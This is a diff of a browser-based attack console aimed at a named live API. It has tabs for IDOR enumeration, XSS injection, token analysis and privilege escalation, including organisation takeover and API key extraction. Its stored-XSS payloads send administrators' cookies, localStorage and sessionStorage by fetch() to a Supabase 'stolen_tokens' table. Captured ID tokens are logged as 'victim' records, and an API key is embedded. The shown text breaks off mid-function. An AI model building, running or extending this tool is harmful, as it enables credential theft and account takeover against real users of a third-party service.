@@ -89,7 +89,7 @@
         .login-loading { display: none; margin-top: 16px; color: #888; font-size: 13px; }
         .login-loading.active { display: block; }
 
-        .main { display: none; padding: 24px; max-width: 1200px; margin: 0 auto; }
+        .main { display: none; padding: 24px; max-width: 1300px; margin: 0 auto; }
         .main.active { display: block; }
 
         .tabs {
@@ -100,15 +100,17 @@
             border-radius: 10px;
             padding: 4px;
             border: 1px solid #2a2a2a;
+            flex-wrap: wrap;
         }
         .tab {
             flex: 1;
-            padding: 10px;
+            min-width: 100px;
+            padding: 10px 6px;
             background: transparent;
             color: #888;
             border: none;
             border-radius: 8px;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
@@ -145,13 +147,14 @@
         .badge-orange { background: #7c2d12; color: #fdba74; }
         .badge-green { background: #14532d; color: #86efac; }
         .badge-blue { background: #1e3a5f; color: #93c5fd; }
+        .badge-purple { background: #4a1d6a; color: #d8b4fe; }
 
         .console {
             background: #0a0a0a;
             border: 1px solid #1a1a1a;
             border-radius: 8px;
             padding: 12px;
-            max-height: 400px;
+            max-height: 500px;
             overflow-y: auto;
             font-family: 'Courier New', monospace;
             font-size: 12px;
@@ -167,10 +170,10 @@
         .log-data { color: #c4b5fd; }
 
         .btn {
-            padding: 10px 20px;
+            padding: 10px 16px;
             border: none;
             border-radius: 8px;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
@@ -210,7 +213,7 @@
 
         .stats {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
             gap: 12px;
             margin-bottom: 16px;
         }
@@ -224,12 +227,12 @@
         .stat-value { font-size: 24px; font-weight: 800; color: #6366f1; }
         .stat-label { font-size: 11px; color: #888; margin-top: 4px; }
 
-        .payload-list { display: flex; flex-direction: column; gap: 8px; }
+        .payload-list { display: flex; flex-direction: column; gap: 6px; max-height: 350px; overflow-y: auto; }
         .payload-item {
             display: flex;
             align-items: center;
             gap: 10px;
-            padding: 10px;
+            padding: 10px 12px;
             background: #0a0a0a;
             border: 1px solid #1a1a1a;
             border-radius: 8px;
@@ -240,24 +243,48 @@
         .payload-item.selected { border-color: #6366f1; background: #1a1030; }
         .payload-item .tag {
             font-size: 10px;
-            padding: 2px 6px;
+            padding: 2px 8px;
             border-radius: 4px;
             font-weight: 700;
             text-transform: uppercase;
+            white-space: nowrap;
         }
         .tag-img { background: #7c2d12; color: #fdba74; }
         .tag-svg { background: #14532d; color: #86efac; }
         .tag-event { background: #1e3a5f; color: #93c5fd; }
         .tag-attr { background: #7f1d1d; color: #fca5a5; }
         .tag-js { background: #4a1d6a; color: #d8b4fe; }
+        .payload-name {
+            font-size: 12px;
+            font-weight: 600;
+            color: #e0e0e0;
+            min-width: 120px;
+            white-space: nowrap;
+        }
         .payload-code {
             flex: 1;
             font-family: 'Courier New', monospace;
-            font-size: 10px;
-            color: #888;
+            font-size: 11px;
+            color: #aaa;
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
+        }
+        .payload-preview {
+            margin-top: 12px;
+            padding: 12px;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+        }
+        .payload-preview h4 { font-size: 12px; color: #888; margin-bottom: 8px; }
+        .payload-preview pre {
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            color: #c4b5fd;
+            white-space: pre-wrap;
+            word-break: break-all;
+            line-height: 1.6;
         }
 
         .idor-table {
@@ -299,6 +326,55 @@
             width: 0%;
             transition: width 0.3s;
         }
+
+        .jwt-decode {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            line-height: 1.6;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .jwt-field { color: #fbbf24; }
+        .jwt-value { color: #86efac; }
+        .jwt-warn { color: #fca5a5; }
+        .jwt-ok { color: #86efac; }
+
+        .endpoint-map {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 8px;
+        }
+        .ep-card {
+            padding: 10px;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            font-size: 11px;
+        }
+        .ep-card.ep-ok { border-color: #14532d; }
+        .ep-card.ep-403 { border-color: #7f1d1d; }
+        .ep-card.ep-400 { border-color: #7c2d12; }
+        .ep-card.ep-404 { border-color: #1a1a1a; }
+        .ep-method { font-weight: 700; color: #93c5fd; }
+        .ep-path { color: #888; font-family: 'Courier New', monospace; }
+        .ep-status { font-weight: 700; }
+        .ep-status.s200 { color: #86efac; }
+        .ep-status.s403 { color: #fca5a5; }
+        .ep-status.s400 { color: #fdba74; }
+        .ep-status.s404 { color: #555; }
+
+        .btn-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
     </style>
 </head>
 <body>
@@ -338,7 +414,7 @@
             </div>
             <div class="stat">
                 <div class="stat-value" id="statXSS">0</div>
-                <div class="stat-label">XSS Injected</div>
+                <div class="stat-label">XSS Vectors</div>
             </div>
             <div class="stat">
                 <div class="stat-value" id="statData">0</div>
@@ -348,18 +424,21 @@
 
         <div class="tabs">
             <button class="tab active" onclick="switchTab('idor')">IDOR Scanner</button>
-            <button class="tab" onclick="switchTab('xss')">Stored XSS</button>
+            <button class="tab" onclick="switchTab('xss')">XSS Attacks</button>
+            <button class="tab" onclick="switchTab('token')">Token Analyzer</button>
+            <button class="tab" onclick="switchTab('privesc')">Privilege Escalation</button>
             <button class="tab" onclick="switchTab('results')">Results</button>
         </div>
 
+        <!-- IDOR SCANNER TAB -->
         <div class="tab-content active" id="tab-idor">
             <div class="card">
                 <h3>IDOR Vulnerability Scanner <span class="badge badge-red">Critical</span></h3>
                 <p style="color:#888;font-size:12px;margin-bottom:16px;">
-                    Enumerate accessible resources by iterating IDs on ODK API endpoints. Tests if a low-privilege user can access other users' projects, forms, and data.
+                    Enumerate accessible resources by iterating IDs on ODK API endpoints. Tests if a low-privilege user can access other users' projects, forms, and data. All findings sent to Supabase.
                 </p>
                 <div class="progress-bar"><div class="progress-fill" id="idorProgress"></div></div>
-                <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap;">
+                <div class="btn-row">
                     <button class="btn btn-primary" onclick="startIDORScan()" id="idorBtn">Start IDOR Scan</button>
                     <button class="btn btn-outline" onclick="startDeepIDOR()">Deep Scan (IDs 1-500)</button>
                     <button class="btn btn-outline" onclick="enumerateUsers()">Enumerate Users</button>
@@ -394,29 +473,50 @@
             </div>
         </div>
 
+        <!-- XSS ATTACKS TAB -->
         <div class="tab-content" id="tab-xss">
             <div class="card">
-                <h3>Stored XSS Injector <span class="badge badge-red">Critical</span></h3>
-                <p style="color:#888;font-size:12px;margin-bottom:16px;">
-                    Inject persistent XSS payloads into ODK Dashboard. When an admin views the injected content, the JavaScript executes in their browser, stealing their tokens, cookies, and localStorage data - all sent to Supabase.
+                <h3>XSS Attack Vectors <span class="badge badge-red">Critical</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    <b>Strategy:</b> Since API write endpoints return 403 (insufficient permissions), we pivot to: (1) Reflected XSS via GET parameters, (2) DOM-based XSS testing, (3) Stored XSS concept proof. All data exfiltrated to Supabase.
                 </p>
-                <h3 style="margin-top:20px;">Select Payload <span class="badge badge-orange">Choose One</span></h3>
-                <div class="payload-list" id="payloadList"></div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="runReflectedXSSTest()">Test Reflected XSS</button>
+                    <button class="btn btn-outline" onclick="runDOMXSSTest()">Test DOM XSS</button>
+                    <button class="btn btn-outline" onclick="testAPIConnection()" style="background:#1a3a1a;color:#86efac;">Test API Connection</button>
+                    <button class="btn btn-danger" onclick="injectAllPayloads()">Try Stored XSS (All Payloads)</button>
+                </div>
+                <div class="console" id="xssLog">
+                    <div class="log-info">[XSS] Ready. Click "Test Reflected XSS" to test if GET endpoints reflect input.</div>
+                </div>
             </div>
+
             <div class="card">
-                <h3>Injection Target <span class="badge badge-blue">API Endpoint</span></h3>
+                <h3>Select XSS Payload <span class="badge badge-orange">12 Vectors</span></h3>
+                <div class="payload-list" id="payloadList"></div>
+                <div class="payload-preview" id="payloadPreview" style="display:none;">
+                    <h4>Full Payload Preview:</h4>
+                    <pre id="payloadPreviewCode"></pre>
+                    <p style="margin-top:8px;font-size:11px;color:#888;" id="payloadPreviewDesc"></p>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Stored XSS Injector <span class="badge badge-blue">API Write</span></h3>
+                <p style="color:#fbbf24;font-size:11px;margin-bottom:12px;">
+                    NOTE: All write endpoints return 403 with current token. If you obtain admin credentials, this will work.
+                </p>
                 <div class="input-group">
                     <label>Target Endpoint:</label>
                     <select id="xssTarget">
-                        <option value="wallet-nonce" style="color:#86efac;">[200] Wallet Nonce (POST /wallet/nonce) - WRITABLE!</option>
-                        <option value="world-create" style="color:#fbbf24;">[400] Create World (POST /worlds) - needs params</option>
-                        <option value="wallet-signin" style="color:#fbbf24;">[400] Wallet Sign-In (POST /wallet/verify/signin) - needs params</option>
-                        <option value="sessions" style="color:#fbbf24;">[400] Sessions (POST /sessions) - needs params</option>
-                        <option value="project" style="color:#fca5a5;">[403] Create Project (POST /organizations/projects)</option>
-                        <option value="org-update" style="color:#fca5a5;">[403] Update Organization (PATCH /organizations/current)</option>
-                        <option value="user-update" style="color:#fca5a5;">[403] Update User (PATCH /accounts/users/current)</option>
-                        <option value="api-key" style="color:#fca5a5;">[403] Create API Key (POST /organizations/apiKeys)</option>
-                        <option value="world-update">Update World (PATCH /worlds/{ID})</option>
+                        <option value="wallet-nonce">POST /wallet/nonce [400]</option>
+                        <option value="world-create">POST /worlds [400]</option>
+                        <option value="wallet-signin">POST /wallet/verify/signin [400]</option>
+                        <option value="sessions">POST /sessions [400]</option>
+                        <option value="project">POST /organizations/projects [403]</option>
+                        <option value="org-update">PATCH /organizations/current [403]</option>
+                        <option value="user-update">PATCH /accounts/users/current [403]</option>
+                        <option value="api-key">POST /organizations/apiKeys [403]</option>
                         <option value="custom">Custom Endpoint</option>
                     </select>
                 </div>
@@ -424,35 +524,89 @@
                     <label>Custom Endpoint:</label>
                     <input type="text" id="xssCustomEndpoint" placeholder="projects/{ID}/custom-field">
                 </div>
-                <div class="input-group" id="projectIdGroup">
-                    <label>Project ID (for update/form/app-user):</label>
-                    <input type="number" id="xssProjectId" value="1">
-                </div>
                 <div class="input-group">
-                    <label>Custom Payload (overrides selected payload above):</label>
+                    <label>Custom Payload (overrides selected):</label>
                     <textarea id="xssCustomPayload" placeholder='Leave empty to use selected payload, or type your own XSS payload here'></textarea>
                 </div>
-                <div style="display:flex;gap:8px;flex-wrap:wrap;">
-                    <button class="btn btn-outline" onclick="testAPIConnection()" id="testConnBtn" style="background:#1a3a1a;color:#86efac;">Test API Connection</button>
-                    <button class="btn btn-primary" onclick="injectXSS()" id="xssBtn">Inject XSS Payload</button>
-                    <button class="btn btn-danger" onclick="injectAllPayloads()">Inject ALL Payloads</button>
-                    <button class="btn btn-outline" onclick="testXSSReflection()">Test Reflection First</button>
-                    <button class="btn btn-outline" onclick="discoverParams()" style="background:#1a3a3a;color:#93c5fd;">Discover Params (400 endpoints)</button>
-                </div>
-            </div>
-            <div class="card">
-                <h3>XSS Injection Log</h3>
-                <div class="console" id="xssLog">
-                    <div class="log-info">[XSS] Click "Test API Connection" first to verify connectivity.</div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="injectXSS()">Inject Selected Payload</button>
+                    <button class="btn btn-outline" onclick="discoverParams()">Discover Params</button>
                 </div>
             </div>
         </div>
 
+        <!-- TOKEN ANALYZER TAB -->
+        <div class="tab-content" id="tab-token">
+            <div class="card">
+                <h3>Token Analyzer <span class="badge badge-purple">JWT Decoder</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:16px;">
+                    Decode and analyze your Firebase ID token. Check claims, permissions, expiration, and custom claims that determine your access level.
+                </p>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="analyzeToken()">Analyze Current Token</button>
+                    <button class="btn btn-outline" onclick="checkTokenRefresh()">Check Token Refresh</button>
+                    <button class="btn btn-outline" onclick="testCustomToken()">Test Custom Token</button>
+                </div>
+                <div class="jwt-decode" id="tokenAnalysis">
+                    <span style="color:#888;">[Token] Click "Analyze Current Token" to decode your JWT.</span>
+                </div>
+            </div>
+            <div class="card">
+                <h3>Security Headers Check <span class="badge badge-blue">CSP/CORS</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:16px;">
+                    Check Content-Security-Policy, CORS headers, and other security configurations on the ODK API.
+                </p>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="checkSecurityHeaders()">Check Security Headers</button>
+                    <button class="btn btn-outline" onclick="checkCORSConfig()">Detailed CORS Check</button>
+                </div>
+                <div class="console" id="headersLog">
+                    <div class="log-info">[Headers] Ready to check security configurations.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PRIVILEGE ESCALATION TAB -->
+        <div class="tab-content" id="tab-privesc">
+            <div class="card">
+                <h3>Privilege Escalation <span class="badge badge-red">Critical</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:16px;">
+                    Attempt to escalate privileges from current read-only access to admin/write access. Tests custom claims manipulation, role injection, API key extraction, and organization takeover.
+                </p>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="runPrivEsc()">Run Privilege Escalation</button>
+                    <button class="btn btn-outline" onclick="tryRoleInjection()">Role Injection</button>
+                    <button class="btn btn-outline" onclick="tryOrgTakeover()">Org Takeover</button>
+                    <button class="btn btn-outline" onclick="tryAPIKeyExtract()">API Key Extract</button>
+                    <button class="btn btn-outline" onclick="tryAdminEndpoints()">Admin Endpoints</button>
+                </div>
+                <div class="console" id="privescLog">
+                    <div class="log-info">[PrivEsc] Ready. Click "Run Privilege Escalation" to start.</div>
+                </div>
+            </div>
+            <div class="card">
+                <h3>Endpoint Authorization Map <span class="badge badge-green">Access Control</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Visual map of which endpoints are accessible vs blocked with your current token.
+                </p>
+                <div class="btn-row">
+                    <button class="btn btn-outline" onclick="mapAllEndpoints()">Map All Endpoints</button>
+                </div>
+                <div class="endpoint-map" id="endpointMap">
+                    <div style="color:#888;font-size:12px;">Click "Map All Endpoints" to generate the authorization map.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- RESULTS TAB -->
         <div class="tab-content" id="tab-results">
             <div class="card">
                 <h3>Exfiltrated Data Summary <span class="badge badge-green">Supabase</span></h3>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="fetchResults()">Refresh from Supabase</button>
+                </div>
                 <div class="console" id="resultsLog" style="max-height:600px;">
-                    <div class="log-info">[Results] Data will appear here after IDOR scans and XSS injections.</div>
+                    <div class="log-info">[Results] Data will appear here after scans and injections.</div>
                 </div>
             </div>
         </div>
@@ -467,7 +621,7 @@
         // CONFIGURATION
         // =====================================================
         const API = 'https://odk.otherside.xyz/api/v0';
-        const PROXY = '/api/proxy';  // Same-domain proxy - no CORS issues!
+        const PROXY = '/api/proxy';
 
         const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c';
@@ -497,19 +651,12 @@
         let selectedPayload = 0;
 
         // =====================================================
-        // XSS PAYLOADS - Execute on ADMIN's browser when they
-        // view injected content in the ODK Dashboard.
-        // Steals: cookies, localStorage, sessionStorage, tokens
-        // All data sent to our Supabase
+        // XSS PAYLOADS
         // =====================================================
-
-        // Full callback - steals everything
         const XSS_CB_FULL = `fetch('${SUPABASE_URL}/rest/v1/stolen_tokens',{method:'POST',headers:{'apikey':'${SUPABASE_ANON_KEY}','Content-Type':'application/json'},body:JSON.stringify({attack_type:'xss_stored',cookies:document.cookie,local_storage:JSON.stringify(Object.keys(localStorage).reduce((o,k)=>(o[k]=localStorage.getItem(k),o),{})),session_storage:JSON.stringify(Object.keys(sessionStorage).reduce((o,k)=>(o[k]=sessionStorage.getItem(k),o),{})),notes:location.href,xss_target:'odk_admin_dashboard'})})`;
 
-        // Compact callback - for fields with length limits
         const XSS_CB_SHORT = `fetch('${SUPABASE_URL}/rest/v1/stolen_tokens',{method:'POST',headers:{'apikey':'${SUPABASE_ANON_KEY}','Content-Type':'application/json'},body:JSON.stringify({attack_type:'xss_stored',c:document.cookie,u:location.href})})`;
 
-        // Minimal callback - ultra-compact
         const XSS_CB_MINI = `fetch('${SUPABASE_URL}/rest/v1/stolen_tokens',{method:'POST',headers:{'apikey':'${SUPABASE_ANON_KEY}','Content-Type':'application/json'},body:JSON.stringify({a:'xss',c:document.cookie})})`;
 
         const XSS_PAYLOADS = [
@@ -721,7 +868,7 @@
         }).catch(() => {});
 
         // =====================================================
-        // IDOR SCANNER
+        // API FETCH HELPERS
         // =====================================================
         async function apiFetch(path, options = {}) {
             if (!idToken) { log('idorLog', '[ERROR] Not authenticated!', 'error'); return null; }
@@ -738,6 +885,53 @@
             } catch(e) { return null; }
         }
 
+        async function proxyFetch(endpoint, options = {}) {
+            const method = options.method || 'GET';
+            const body = options.body || null;
+            try {
+                const resp = await fetch(PROXY, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: endpoint,
+                        method: method,
+                        body: body,
+                        token: idToken || ''
+                    })
+                });
+                const result = await resp.json();
+                return {
+                    ok: result.status >= 200 && result.status < 300,
+                    status: result.status,
+                    statusText: result.statusText || '',
+                    json: async () => result.data,
+                    text: async () => typeof result.data === 'string' ? result.data : JSON.stringify(result.data),
+                    headers: result.headers || {},
+                    _proxyResult: result
+                };
+            } catch(e) {
+                throw new Error(`Proxy fetch failed: ${e.message}`);
+            }
+        }
+
+        async function apiGet(endpoint) {
+            try {
+                const headers = { 'Content-Type': 'application/json' };
+                if (idToken) headers['Authorization'] = `Bearer ${idToken}`;
+                const resp = await fetch(`${API}/${endpoint}`, { headers });
+                return resp;
+            } catch(e) {
+                return await proxyFetch(endpoint, { method: 'GET' });
+            }
+        }
+
+        async function apiWrite(endpoint, method, body) {
+            return await proxyFetch(endpoint, { method, body });
+        }
+
+        // =====================================================
+        // IDOR SCANNER
+        // =====================================================
         async function startIDORScan() {
             if (!idToken) { log('idorLog', '[ERROR] Authenticate first!', 'error'); return; }
             document.getElementById('idorBtn').disabled = true;
@@ -758,6 +952,8 @@
                 { path: 'origin/streaming', type: 'single', desc: 'Streaming' },
                 { path: 'origin/sessions/queue', type: 'single', desc: 'Sessions Queue' },
                 { path: 'origin/monitoring', type: 'single', desc: 'Monitoring' },
+                { path: 'wallet/nonce', type: 'single', desc: 'Wallet Nonce' },
+                { path: 'sessions', type: 'list', desc: 'Sessions' },
             ];
 
             let total = targets.length;
@@ -774,7 +970,8 @@
                 if (resp) {
                     const status = resp.status;
                     if (status === 200) {
-                        const data = await resp.json();
+                        let data;
+                        try { data = await resp.json(); } catch(e) { data = await resp.text(); }
                         log('idorLog', `[+] ${target.desc}: ACCESSIBLE (${JSON.stringify(data).substring(0, 100)}...)`, 'success');
 
                         await saveToSupabase({
@@ -987,150 +1184,302 @@
         }
 
         // =====================================================
-        // STORED XSS INJECTION
+        // XSS PAYLOAD RENDERING - FIXED: Shows name + code
         // =====================================================
-
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-
         function renderPayloads() {
             const list = document.getElementById('payloadList');
             list.innerHTML = '';
             XSS_PAYLOADS.forEach((p, i) => {
                 const item = document.createElement('div');
                 item.className = `payload-item${i === selectedPayload ? ' selected' : ''}`;
-                item.onclick = () => { selectedPayload = i; renderPayloads(); };
-                // Use textContent for payload code to prevent HTML rendering
+                item.onclick = () => { selectedPayload = i; renderPayloads(); showPayloadPreview(i); };
+
                 const tagSpan = document.createElement('span');
                 tagSpan.className = `tag ${p.tagClass}`;
                 tagSpan.textContent = p.tag;
+
+                const nameSpan = document.createElement('span');
+                nameSpan.className = 'payload-name';
+                nameSpan.textContent = p.name;
+
                 const codeDiv = document.createElement('div');
                 codeDiv.className = 'payload-code';
-                codeDiv.textContent = p.payload.substring(0, 120) + (p.payload.length > 120 ? '...' : '');
+                codeDiv.textContent = p.payload.substring(0, 80) + (p.payload.length > 80 ? '...' : '');
+
                 item.appendChild(tagSpan);
+                item.appendChild(nameSpan);
                 item.appendChild(codeDiv);
-                item.title = p.desc + '\n\nFull payload:\n' + p.payload;
                 list.appendChild(item);
             });
+            // Show preview of selected payload
+            showPayloadPreview(selectedPayload);
         }
+
+        function showPayloadPreview(index) {
+            const preview = document.getElementById('payloadPreview');
+            const codeEl = document.getElementById('payloadPreviewCode');
+            const descEl = document.getElementById('payloadPreviewDesc');
+            const p = XSS_PAYLOADS[index];
+
+            preview.style.display = 'block';
+            codeEl.textContent = p.payload;
+            descEl.textContent = p.desc + ' | Length: ' + p.payload.length + ' chars';
+        }
+
         renderPayloads();
 
         document.getElementById('xssTarget').addEventListener('change', function() {
             const val = this.value;
             document.getElementById('customEndpointGroup').style.display = val === 'custom' ? 'block' : 'none';
-            document.getElementById('projectIdGroup').style.display =
-                val === 'world-update' ? 'block' : 'none';
         });
 
         // =====================================================
-        // PROXY FETCH - Uses same-domain Vercel serverless proxy
-        // No CORS issues because proxy is on same domain!
+        // REFLECTED XSS TESTING
         // =====================================================
-        async function proxyFetch(endpoint, options = {}) {
-            const method = options.method || 'GET';
-            const body = options.body || null;
+        async function runReflectedXSSTest() {
+            if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('xssLog', '[REFLECTED XSS] Testing if GET endpoints reflect input...', 'info');
 
-            try {
-                const resp = await fetch(PROXY, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        endpoint: endpoint,
-                        method: method,
-                        body: body,
-                        token: idToken || ''
-                    })
-                });
+            const testPayloads = [
+                { name: 'Basic XSS marker', payload: 'xss_test_1337' },
+                { name: 'HTML injection', payload: '<h1>xss1337</h1>' },
+                { name: 'Script tag', payload: '<script>alert(1)</script>' },
+                { name: 'img onerror', payload: '<img src=x onerror="alert(1)">' },
+                { name: 'SVG onload', payload: '<svg onload="alert(1)">' },
+                { name: 'Double encoding', payload: '%3Cscript%3Ealert(1)%3C/script%3E' },
+                { name: 'Unicode escape', payload: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e' },
+            ];
 
-                const result = await resp.json();
+            // Test GET endpoints with query params
+            const getEndpoints = [
+                { ep: 'projects', param: 'q', desc: 'Projects Search' },
+                { ep: 'organizations/projects', param: 'q', desc: 'Org Projects Search' },
+                { ep: 'worlds', param: 'q', desc: 'Worlds Search' },
+                { ep: 'organizations/current', param: 'format', desc: 'Org Format' },
+                { ep: 'accounts/users/current', param: 'fields', desc: 'User Fields' },
+                { ep: 'sessions', param: 'q', desc: 'Sessions Search' },
+                { ep: 'wallet/nonce', param: 'address', desc: 'Wallet Address' },
+                { ep: 'permissions/roles', param: 'q', desc: 'Roles Search' },
+            ];
 
-                // Create a Response-like object from the proxy result
-                return {
-                    ok: result.status >= 200 && result.status < 300,
-                    status: result.status,
-                    statusText: result.statusText || '',
-                    json: async () => result.data,
-                    text: async () => typeof result.data === 'string' ? result.data : JSON.stringify(result.data),
-                    _proxyResult: result
-                };
-            } catch(e) {
-                throw new Error(`Proxy fetch failed: ${e.message}`);
+            let reflected = 0;
+
+            for (const endpoint of getEndpoints) {
+                log('xssLog', `[TEST] Testing ${endpoint.desc} (/api/v0/${endpoint.ep}?${endpoint.param}=...)`, 'info');
+
+                for (const test of testPayloads) {
+                    try {
+                        const url = `${API}/${endpoint.ep}?${endpoint.param}=${encodeURIComponent(test.payload)}`;
+                        const headers = { 'Content-Type': 'application/json' };
+                        if (idToken) headers['Authorization'] = `Bearer ${idToken}`;
+
+                        const resp = await fetch(url, { headers });
+                        if (resp.ok) {
+                            const text = await resp.text();
+
+                            // Check if our payload is reflected in the response
+                            if (text.includes(test.payload) || text.includes(decodeURIComponent(test.payload))) {
+                                log('xssLog', `[+] REFLECTED! ${endpoint.desc} reflects "${test.name}" in response!`, 'success');
+                                log('xssLog', `    Response contains: ...${text.substring(text.indexOf(test.payload.substring(0,10)), text.indexOf(test.payload.substring(0,10)) + 100)}...`, 'data');
+
+                                reflected++;
+                                xssInjected++;
+
+                                await saveToSupabase({
+                                    attack_type: 'xss_reflected',
+                                    victim_email: currentUser?.email || '',
+                                    victim_uid: currentUser?.uid || '',
+                                    id_token: idToken,
+                                    xss_target: `GET /api/v0/${endpoint.ep}?${endpoint.param}=${test.payload}`,
+                                    xss_payload: test.payload,
+                                    notes: `Reflected XSS: ${endpoint.desc} reflects ${test.name}. Payload appears in response body without encoding.`
+                                });
+                            } else if (text.includes('xss_test_1337') || text.includes('xss1337') || text.includes('alert(1)')) {
+                                log('xssLog', `[~] PARTIAL: ${endpoint.desc} - some content reflected (check encoding)`, 'warning');
+                            }
+                        }
+                    } catch(e) {
+                        // Silent fail
+                    }
+                    await new Promise(r => setTimeout(r, 100));
+                }
             }
+
+            if (reflected === 0) {
+                log('xssLog', '[-] No reflected XSS found in GET endpoints.', 'warning');
+                log('xssLog', '[INFO] This means GET endpoints don\'t echo parameters in responses.', 'info');
+            } else {
+                log('xssLog', `[+] Found ${reflected} reflected XSS vectors!`, 'success');
+            }
+
+            // Also test error messages for reflection
+            log('xssLog', '[TEST] Testing error message reflection...', 'info');
+            const errorEndpoints = [
+                `projects/999999`,
+                `organizations/<script>alert(1)</script>`,
+                `users/<img src=x onerror=alert(1)>`,
+            ];
+
+            for (const ep of errorEndpoints) {
+                try {
+                    const headers = { 'Content-Type': 'application/json' };
+                    if (idToken) headers['Authorization'] = `Bearer ${idToken}`;
+                    const resp = await fetch(`${API}/${ep}`, { headers });
+                    const text = await resp.text();
+
+                    if (text.includes('<script>') || text.includes('<img') || text.includes('onerror')) {
+                        log('xssLog', `[+] ERROR REFLECTION! /${ep} reflects HTML in error message!`, 'success');
+                        reflected++;
+
+                        await saveToSupabase({
+                            attack_type: 'xss_error_reflection',
+                            victim_email: currentUser?.email || '',
+                            victim_uid: currentUser?.uid || '',
+                            id_token: idToken,
+                            xss_target: `GET /api/v0/${ep}`,
+                            xss_payload: 'error_page_reflection',
+                            notes: `Error page XSS: /${ep} reflects input in error page HTML`
+                        });
+                    }
+                } catch(e) {}
+            }
+
+            log('xssLog', `[DONE] Reflected XSS test complete. Found: ${reflected}`, 'success');
+            updateStats();
         }
 
-        // Direct fetch for GET requests (CORS * works fine for GET)
-        async function apiGet(endpoint) {
-            try {
-                const headers = { 'Content-Type': 'application/json' };
-                if (idToken) headers['Authorization'] = `Bearer ${idToken}`;
-                const resp = await fetch(`${API}/${endpoint}`, { headers });
-                return resp;
-            } catch(e) {
-                // Fallback to proxy
-                return await proxyFetch(endpoint, { method: 'GET' });
-            }
-        }
+        // =====================================================
+        // DOM-BASED XSS TESTING
+        // =====================================================
+        async function runDOMXSSTest() {
+            if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('xssLog', '[DOM XSS] Testing DOM-based XSS vectors...', 'info');
 
-        // Write fetch (POST/PATCH/PUT/DELETE) - always use proxy
-        async function apiWrite(endpoint, method, body) {
-            return await proxyFetch(endpoint, { method, body });
+            const domTests = [
+                {
+                    name: 'document.write via URL param',
+                    desc: 'Check if ODK frontend uses document.write with URL params',
+                    test: () => {
+                        // Test if window.location.search/hash is used unsafely
+                        const params = new URLSearchParams(window.location.search);
+                        log('xssLog', `[DOM] Current URL params: ${params.toString() || 'none'}`, 'info');
+                        log('xssLog', `[DOM] Try: https://odk.otherside.xyz/?search="><img src=x onerror=alert(1)>`, 'warning');
+                        log('xssLog', `[DOM] Try: https://odk.otherside.xyz/#<img src=x onerror=alert(1)>`, 'warning');
+                    }
+                },
+                {
+                    name: 'postMessage listener',
+                    desc: 'Check if ODK has vulnerable postMessage handlers',
+                    test: () => {
+                        log('xssLog', `[DOM] Testing postMessage XSS...`, 'info');
+                        // Send a malicious postMessage to see if the page processes it
+                        const testMsg = JSON.stringify({ type: 'xss_test', data: '<img src=x onerror=alert(1)>' });
+                        window.postMessage(testMsg, '*');
+                        log('xssLog', `[DOM] Sent test postMessage. Check if ODK page at otherside.xyz has listener.`, 'info');
+                    }
+                },
+                {
+                    name: 'localStorage injection',
+                    desc: 'Try injecting XSS into localStorage keys that ODK might read',
+                    test: async () => {
+                        const xssKeys = [
+                            { key: 'odk_username', val: '<img src=x onerror=alert(1)>' },
+                            { key: 'odk_displayName', val: '<svg onload=alert(1)>' },
+                            { key: 'odk_settings', val: '{"name":"<img src=x onerror=alert(1)>"}' },
+                            { key: 'user_preferences', val: '{"theme":"<script>alert(1)</script>"}' },
+                        ];
+
+                        for (const k of xssKeys) {
+                            try {
+                                localStorage.setItem(k.key, k.val);
+                                log('xssLog', `[DOM] Injected localStorage: ${k.key} = ${k.val}`, 'warning');
+                            } catch(e) {}
+                        }
+
